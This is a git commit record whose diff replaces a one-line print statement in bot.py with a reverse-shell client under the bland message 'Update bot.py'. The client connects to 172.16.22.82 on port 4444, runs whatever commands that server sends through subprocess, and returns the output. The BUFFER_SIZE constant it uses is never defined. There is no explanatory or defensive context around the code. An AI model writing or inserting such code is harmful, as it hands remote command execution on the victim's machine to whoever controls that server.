f1067b79ee6f95a96d4758ae88194208d9dc68f9
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:29:33 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,1 +1,16 @@
-print("hey")
+import socket
+import subprocess
+SERVER_HOST = "172.16.22.82"
+SERVER_PORT = 4444
+
+s = socket.socket()
+s.connect((SERVER_HOST, SERVER_PORT))
+message = s.recv(BUFFER_SIZE).decode()
+print("Server:", message)
+while True:
+	command = s.recv(BUFFER_SIZE).decode()
+	if command.lower() == "exit":
+		break
+	output = subprocess.getoutput(command)
+	s.send(output.encode())
+s.close()
